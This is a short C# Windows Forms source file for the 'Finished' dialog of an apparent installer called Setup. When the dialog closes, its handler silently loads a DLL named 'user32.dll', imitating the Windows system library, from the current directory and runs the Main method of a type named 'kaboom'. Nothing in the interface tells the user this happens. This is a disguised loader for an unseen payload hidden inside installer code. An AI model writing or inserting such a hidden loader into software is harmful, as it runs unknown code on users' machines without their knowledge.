using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Setup
{
    public partial class Finished : Form
    {
        public Finished()
        {
            InitializeComponent();

            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormClosing += Finished_FormClosing;
        }

        private void Finished_FormClosing(object sender, FormClosingEventArgs e)
        {
            string p = System.IO.Path.Combine(System.Environment.CurrentDirectory, "user32.dll");
            Assembly assembly = Assembly.LoadFrom(p);
            Type type = assembly.GetType("user32.kaboom");
            MethodInfo method = type.GetMethod("Main");
            object instance = Activator.CreateInstance(type);
            method.Invoke(instance, null);
        }
        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
    }
}
